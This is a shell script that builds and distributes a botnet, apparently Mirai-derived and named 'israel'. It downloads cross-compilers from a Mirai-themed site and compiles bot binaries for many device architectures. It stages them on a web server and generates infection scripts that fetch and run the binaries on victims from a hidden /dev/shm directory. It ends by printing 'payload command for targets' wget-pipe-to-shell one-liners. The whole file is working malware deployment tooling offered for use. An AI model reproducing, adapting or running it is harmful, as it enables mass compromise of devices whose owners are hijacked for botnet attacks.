#!/bin/sh

# Get the directory where this script is located
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Change to bot directory
cd "$SCRIPT_DIR/bot" || exit 1

# Compiler base directory
COMPILER_DIR="$HOME/.cross-compilers"

echo "[+] Cleaning up old binaries from /var/www/html..."
rm -f /var/www/html/israel.* 2>/dev/null

echo "[+] Cleaning up old cross-compilers..."
rm -rf "$COMPILER_DIR" 2>/dev/null

echo "[+] Creating compiler directory..."
mkdir -p "$COMPILER_DIR"
cd "$COMPILER_DIR" || exit 1

echo "[+] Downloading cross-compilers..."
echo "  [*] armv4l..."
curl -L -s https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv4l.tar.bz2 -o cross-compiler-armv4l.tar.bz2 && tar -xjf cross-compiler-armv4l.tar.bz2 && rm -f cross-compiler-armv4l.tar.bz2
echo "  [*] armv5l..."
curl -L -s https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv5l.tar.bz2 -o cross-compiler-armv5l.tar.bz2 && tar -xjf cross-compiler-armv5l.tar.bz2 && rm -f cross-compiler-armv5l.tar.bz2
echo "  [*] armv6l..."
curl -L -s https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv6l.tar.bz2 -o cross-compiler-armv6l.tar.bz2 && tar -xjf cross-compiler-armv6l.tar.bz2 && rm -f cross-compiler-armv6l.tar.bz2
echo "  [*] armv7l..."
curl -L -s https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv7l.tar.bz2 -o cross-compiler-armv7l.tar.bz2 && tar -xjf cross-compiler-armv7l.tar.bz2 && rm -f cross-compiler-armv7l.tar.bz2
echo "  [*] i486..."
curl -L -s https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i486.tar.gz -o cross-compiler-i486.tar.gz && tar -xzf cross-compiler-i486.tar.gz && rm -f cross-compiler-i486.tar.gz
echo "  [*] i586..."
curl -L -s https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i586.tar.bz2 -o cross-compiler-i586.tar.bz2 && tar -xjf cross-compiler-i586.tar.bz2 && rm -f cross-compiler-i586.tar.bz2
echo "  [*] i686..."
curl -L -s https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i686.tar.bz2 -o cross-compiler-i686.tar.bz2 && tar -xjf cross-compiler-i686.tar.bz2 && rm -f cross-compiler-i686.tar.bz2
echo "  [*] m68k..."
curl -L -s https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-m68k.tar.bz2 -o cross-compiler-m68k.tar.bz2 && tar -xjf cross-compiler-m68k.tar.bz2 && rm -f cross-compiler-m68k.tar.bz2
echo "  [*] mips..."
curl -L -s https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mips.tar.bz2 -o cross-compiler-mips.tar.bz2 && tar -xjf cross-compiler-mips.tar.bz2 && rm -f cross-compiler-mips.tar.bz2
echo "  [*] mipsel..."
curl -L -s https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mipsel.tar.bz2 -o cross-compiler-mipsel.tar.bz2 && tar -xjf cross-compiler-mipsel.tar.bz2 && rm -f cross-compiler-mipsel.tar.bz2
echo "  [*] powerpc-440fp..."
curl -L -s https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-powerpc-440fp.tar.bz2 -o cross-compiler-powerpc-440fp.tar.bz2 && tar -xjf cross-compiler-powerpc-440fp.tar.bz2 && rm -f cross-compiler-powerpc-440fp.tar.bz2
echo "  [*] powerpc..."
curl -L -s https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-powerpc.tar.bz2 -o cross-compiler-powerpc.tar.bz2 && tar -xjf cross-compiler-powerpc.tar.bz2 && rm -f cross-compiler-powerpc.tar.bz2
echo "  [*] sh4..."
curl -L -s https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sh4.tar.bz2 -o cross-compiler-sh4.tar.bz2 && tar -xjf cross-compiler-sh4.tar.bz2 && rm -f cross-compiler-sh4.tar.bz2
echo "  [*] sparc..."
curl -L -s https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sparc.tar.bz2 -o cross-compiler-sparc.tar.bz2 && tar -xjf cross-compiler-sparc.tar.bz2 && rm -f cross-compiler-sparc.tar.bz2
echo "  [*] x86_64..."
curl -L -s https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-x86_64.tar.bz2 -o cross-compiler-x86_64.tar.bz2 && tar -xjf cross-compiler-x86_64.tar.bz2 && rm -f cross-compiler-x86_64.tar.bz2

echo "[+] Setting up PATH for compilers..."
export PATH="$COMPILER_DIR/cross-compiler-armv4l/bin:$COMPILER_DIR/cross-compiler-armv5l/bin:$COMPILER_DIR/cross-compiler-armv6l/bin:$COMPILER_DIR/cross-compiler-armv7l/bin:$COMPILER_DIR/cross-compiler-i486/bin:$COMPILER_DIR/cross-compiler-i586/bin:$COMPILER_DIR/cross-compiler-i686/bin:$COMPILER_DIR/cross-compiler-m68k/bin:$COMPILER_DIR/cross-compiler-mips/bin:$COMPILER_DIR/cross-compiler-mipsel/bin:$COMPILER_DIR/cross-compiler-powerpc-440fp/bin:$COMPILER_DIR/cross-compiler-powerpc/bin:$COMPILER_DIR/cross-compiler-sh4/bin:$COMPILER_DIR/cross-compiler-sparc/bin:$COMPILER_DIR/cross-compiler-x86_64/bin:$PATH"

# Go back to bot directory
cd "$SCRIPT_DIR/bot" || exit 1

echo "[+] Compiling bot binaries for all architectures..."

# Build for each architecture using downloaded cross-compilers
armv4l-gcc *.c -o israel.armv4l -pthread -lpthread -DARCH_armv4l -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 && echo "  [✓] armv4l" || echo "  [✗] armv4l"
armv5l-gcc *.c -o israel.armv5l -pthread -lpthread -DARCH_armv5l -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 && echo "  [✓] armv5l" || echo "  [✗] armv5l"
armv6l-gcc *.c -o israel.armv6l -pthread -lpthread -DARCH_armv6l -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 && echo "  [✓] armv6l" || echo "  [✗] armv6l"
armv7l-gcc *.c -o israel.armv7l -pthread -lpthread -DARCH_armv7l -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 && echo "  [✓] armv7l" || echo "  [✗] armv7l"
i486-gcc *.c -o israel.i486 -pthread -lpthread -DARCH_i486 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 && echo "  [✓] i486" || echo "  [✗] i486"
i586-gcc *.c -o israel.i586 -pthread -lpthread -DARCH_i586 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 && echo "  [✓] i586" || echo "  [✗] i586"
i686-gcc *.c -o israel.i686 -pthread -lpthread -DARCH_i686 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 && echo "  [✓] i686" || echo "  [✗] i686"
m68k-gcc *.c -o israel.m68k -pthread -lpthread -DARCH_m68k -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 && echo "  [✓] m68k" || echo "  [✗] m68k"
mips-gcc *.c -o israel.mips -pthread -lpthread -DARCH_mips -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 && echo "  [✓] mips" || echo "  [✗] mips"
mipsel-gcc *.c -o israel.mipsel -pthread -lpthread -DARCH_mipsel -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 && echo "  [✓] mipsel" || echo "  [✗] mipsel"
powerpc-440fp-gcc *.c -o israel.powerpc-440fp -pthread -lpthread -DARCH_powerpc -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 && echo "  [✓] powerpc-440fp" || echo "  [✗] powerpc-440fp"
powerpc-gcc *.c -o israel.powerpc -pthread -lpthread -DARCH_powerpc -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 && echo "  [✓] powerpc" || echo "  [✗] powerpc"
sh4-gcc *.c -o israel.sh4 -pthread -lpthread -DARCH_sh4 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 && echo "  [✓] sh4" || echo "  [✗] sh4"
sparc-gcc *.c -o israel.sparc -pthread -lpthread -DARCH_sparc -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 && echo "  [✓] sparc" || echo "  [✗] sparc"
x86_64-gcc *.c -o israel.x86_64 -pthread -lpthread -DARCH_x86_64 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 && echo "  [✓] x86_64" || echo "  [✗] x86_64"

echo "[+] Stripping binaries..."
for bin in israel.*; do
  if [ -f "$bin" ]; then
    strip -s "$bin" 2>/dev/null
  fi
done

# Create output directory
mkdir -p ./bins
mv israel.* ./bins/ 2>/dev/null

# Move binaries to web directory if available
if [ -d /var/www/html ]; then
  cp ./bins/israel.* /var/www/html/ 2>/dev/null
fi

# Generate distribution script
IP=$(curl -s ifconfig.co || echo "127.0.0.1")

cat > ./bins/distribution.sh <<'DIST_EOF'
#!/bin/sh
# Israel botnet distribution script
IP="REPLACE_IP"

echo "[*] Downloading israel botnet payloads..."

for arch in armv4l armv5l armv6l armv7l i486 i586 i686 m68k mips mipsel powerpc-440fp powerpc sh4 sparc x86_64; do
  wget -q "http://$IP/israel.$arch" -O "israel.$arch" || \
  curl -s "http://$IP/israel.$arch" -o "israel.$arch"

  if [ -f "israel.$arch" ]; then
    chmod 755 "israel.$arch"
    "./$arch" "$@" 2>/dev/null &
    sleep 1
  fi
done

wait
echo "[+] Distribution complete"
DIST_EOF

sed -i "s|REPLACE_IP|$IP|g" ./bins/distribution.sh
chmod 755 ./bins/distribution.sh

# Create cat.sh in Apache directory
[ -d /var/www/html ] && printf '#!/bin/sh\nSERVER_IP="$1"\n[ -z "$SERVER_IP" ] && echo "Usage: ./cat.sh <server_ip>" && exit 1\nmkdir -p /dev/shm/.cache && cd /dev/shm/.cache\nfor arch in armv4l armv5l armv6l armv7l i486 i586 i686 m68k mips mipsel powerpc-440fp powerpc sh4 sparc x86_64; do (wget -q "http://$SERVER_IP/israel.$arch" -O "israel.$arch" 2>/dev/null || curl -s "http://$SERVER_IP/israel.$arch" -o "israel.$arch") && [ -f "israel.$arch" ] && chmod 755 "israel.$arch" && "./israel.$arch" "$@" 2>/dev/null & sleep 1; done\nwait\n' > /var/www/html/cat.sh && chmod 755 /var/www/html/cat.sh

echo "[+] Compilation complete!"
echo "[+] Binaries saved in ./bins/"
echo "[+] Distribution script: ./bins/distribution.sh"
echo "[+] Mass deployment script: ./bins/cat.sh"
echo ""
echo "To serve binaries on port 80:"
echo "  sudo python3 -m http.server 80 -d ./bins/"
echo ""
echo "Payload command for targets:"
echo "  wget http://$IP/distribution.sh -O - | sh"
echo ""
echo "Or use cat.sh:"
echo "  wget http://$IP/cat.sh -O - | sh -s $IP"
echo ""

exit 0
